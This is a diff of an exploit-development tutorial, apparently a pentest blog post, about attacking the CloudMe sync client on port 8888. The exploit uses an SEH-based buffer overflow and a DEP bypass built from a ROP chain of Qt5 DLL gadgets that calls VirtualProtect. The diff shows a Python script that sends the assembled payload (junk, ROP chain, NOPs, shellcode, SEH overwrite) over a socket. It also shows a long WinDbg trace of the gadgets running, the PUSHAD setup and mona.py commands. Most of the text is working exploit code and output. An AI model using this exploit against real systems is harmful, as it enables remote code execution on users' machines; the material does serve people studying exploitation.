+payload = junk1 + rop + nops + buf + junk2 + seh
+
+try:
+   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((target,8888))
+   s.send(payload)
+except Exception as e:
+   print(sys.exc_value)
 ```
 
 Below is a snippet of the debugging session illustrating the newly added ROP gadgets:
 
 ```
-0:000\> bp 0x6998fb2e \*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 0:000\> bl 0 e 6998fb2e 0001 (0001) 0:\*\*\*\* Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e 0:000\> g Breakpoint 0 hit eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000 eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e: 6998fb2e 81c46c070000 add esp,76Ch 0:000\> t eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000 eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884: 6998fb34 5b pop ebx 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000 eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885: 6998fb35 5e pop esi 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=00000000 eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886: 6998fb36 5f pop edi 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887: 6998fb37 5d pop ebp 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888: 6998fb38 c3 ret 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=699012c9 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network+0x12c9: 699012c9 5d pop ebp 0:000\> \*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=699012ca esp=0022d69c ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network+0x12ca: 699012ca c3 ret 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=68a9559e esp=0022d6a0 ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!Z21qt\_logging\_to\_consolev+0x8e: 68a9559e 95 xchg eax,ebp 0:000\> eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=68a9559f esp=0022d6a0 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!Z21qt\_logging\_to\_consolev+0x8f: 68a9559f c3 ret 0:000\> eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=68ae4fe3 esp=0022d6a4 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS\_5StateEPi+0xdf3: 68ae4fe3 59 pop ecx 0:000\> eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ae4fe4 esp=0022d6a8 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS\_5StateEPi+0xdf4: 68ae4fe4 c3 ret 0:000\> eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ad422b esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!ZNK5QTime4hourEv+0x1b: 68ad422b 29c8 sub eax,ecx 0:000\> eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ad422d esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Core!ZNK5QTime4hourEv+0x1d: 68ad422d c3 ret 0:000\> eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ae8a22 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Core!ZNK12QEasingCurve4typeEv+0x2: 68ae8a22 8b00 mov eax,dword ptr [eax] ds:0023:0022ff8c=453c2f76 0:000\> eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ae8a24 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Core!ZNK12QEasingCurve4typeEv+0x4: 68ae8a24 c3 ret 0:000\> eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68a812c9 esp=0022d6b4 ebp=00000000 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Core+0x12c9: 68a812c9 5d pop ebp 0:000\> \*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll - eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68a812ca esp=0022d6b8 ebp=fffae493 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Core+0x12ca: 68a812ca c3 ret 0:000\> eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=61ba8137 esp=0022d6bc ebp=fffae493 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Gui!ZN7QWindow4setXEi+0x77: 61ba8137 01e8 add eax,ebp 0:000\> eax=762a20d8 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=61ba8139 esp=0022d6bc ebp=fffae493 iopl=0 nv up ei pl nz na pe cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000207 Qt5Gui!ZN7QWindow4setXEi+0x79: 61ba8139 c3 ret
+0:000> bp 0x6998fb2e
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
+0:000> bl
+0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
+0:000> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
+eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e:
+6998fb2e 81c46c070000 add esp,76Ch
+0:000> t
+eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
+eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884:
+6998fb34 5b pop ebx
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
+eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885:
+6998fb35 5e pop esi
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=00000000
+eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886:
+6998fb36 5f pop edi
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887:
+6998fb37 5d pop ebp
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
+6998fb38 c3 ret
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=699012c9 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network+0x12c9:
+699012c9 5d pop ebp
+0:000> 
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=699012ca esp=0022d69c ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network+0x12ca:
+699012ca c3 ret
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=68a9559e esp=0022d6a0 ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!Z21qt_logging_to_consolev+0x8e:
+68a9559e 95 xchg eax,ebp
+0:000> 
+eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=68a9559f esp=0022d6a0 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!Z21qt_logging_to_consolev+0x8f:
+68a9559f c3 ret
+0:000> 
+eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=68ae4fe3 esp=0022d6a4 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf3:
+68ae4fe3 59 pop ecx
+0:000> 
+eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ae4fe4 esp=0022d6a8 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf4:
+68ae4fe4 c3 ret
+0:000> 
+eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ad422b esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!ZNK5QTime4hourEv+0x1b:
+68ad422b 29c8 sub eax,ecx
+0:000> 
+eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ad422d esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Core!ZNK5QTime4hourEv+0x1d:
+68ad422d c3 ret
+0:000> 
+eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ae8a22 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Core!ZNK12QEasingCurve4typeEv+0x2:
+68ae8a22 8b00 mov eax,dword ptr [eax] ds:0023:0022ff8c=453c2f76
+0:000> 
+eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ae8a24 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Core!ZNK12QEasingCurve4typeEv+0x4:
+68ae8a24 c3 ret
+0:000> 
+eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68a812c9 esp=0022d6b4 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Core+0x12c9:
+68a812c9 5d pop ebp
+0:000> 
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll - 
+eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68a812ca esp=0022d6b8 ebp=fffae493 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Core+0x12ca:
+68a812ca c3 ret
+0:000> 
+eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=61ba8137 esp=0022d6bc ebp=fffae493 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Gui!ZN7QWindow4setXEi+0x77:
+61ba8137 01e8 add eax,ebp
+0:000> 
+eax=762a20d8 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=61ba8139 esp=0022d6bc ebp=fffae493 iopl=0 nv up ei pl nz na pe cy
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000207
+Qt5Gui!ZN7QWindow4setXEi+0x79:
+61ba8139 c3 ret
 ```
 
 As shown above in red, after executing the last gadget, the address of **VirtualProtect** ( **0x762a20d8** ) will be stored in the EAX register.
@@ -1213,7 +1572,13 @@ As shown above in red, after executing the last gadget, the address of **Virtual
 This section shows how to bypass DEP by using **VirtualProtect** in order to set the access protection to **PAGE\_EXECUTE\_READWRITE** on the memory region containing the shellcode. The following parameters must be specified in order to successfully execute **VirtualProtect** :
 
 ```
-BOOL WINAPI VirtualProtect(\_\_inLPVOID lpAddress,\_\_inSIZE\_T dwSize,\_\_inDWORD flNewProtect,\_\_outPDWORD lpflOldProtect);
+BOOL WINAPI VirtualProtect(
+          __in   LPVOID lpAddress,
+          __in   SIZE_T dwSize,
+          __in   DWORD flNewProtect,
+          __out  PDWORD lpflOldProtect
+    );
+
 ```
 
 In order to implement the ROP chain to bypass DEP we will use the **PUSHAD** technique as follows :
@@ -1227,19 +1592,36 @@ At this point we are about to create the ROP chain that will enforce DEP bypass.
 The PUSHAD instruction&nbsp; **always** pushes all 8 general purpose registers onto the stack. A single **PUSHAD** instruction is equivalent to the following
 
 ```
-Push EAX Push ECX Push EDX Push EBX Push ESP Push EBP Push ESI Push EDI
+Push EAX
+Push ECX
+Push EDX
+Push EBX
+Push ESP
+Push EBP
+Push ESI
+Push EDI
 ```
 
 So, in our case the arguments of **VirtualProtect** will be pushed in stack using **PUSHAD** as follows.
 
 ```
-Stack: EAX (NOP) ECX (lpflOldProtect) EDX (flNewProtect)EBX (dwSize)ESP (lpAddress)EBP (ReturnAddress)ESI (VirtualProtect)EDI (ROP NOP)
+Stack:
+EAX (NOP)
+ECX (lpflOldProtect)
+EDX (flNewProtect)
+EBX (dwSize)
+ESP (lpAddress)
+EBP (ReturnAddress)
+ESI (VirtualProtect)
+EDI (ROP NOP) 
 ```
 
 From **Windbg** , using **mona.py** we can generate the ROP chain as follows
 
 ```
-0:000\> !load pykd.pyd0:000\> !py mona rop -n -o[...]
+0:000> !load pykd.pyd
+0:000> !py mona rop -n -o
+[...]
 ```
 
 Unfortunately, the ROP chains generated with **mona.py** won't fit our needs, because some gadgets are missing. Nevertheless, we can still implement the ROP chain manually with the help of the generated gadgets from **mona.py.** Also, the ROP chain should be manually implemented, because we have already used some gadgets before, in order to dynamically load the **VirtualProtect** address, and this should cause changes to the sequence of the chain and also the sequence of the gadgets.
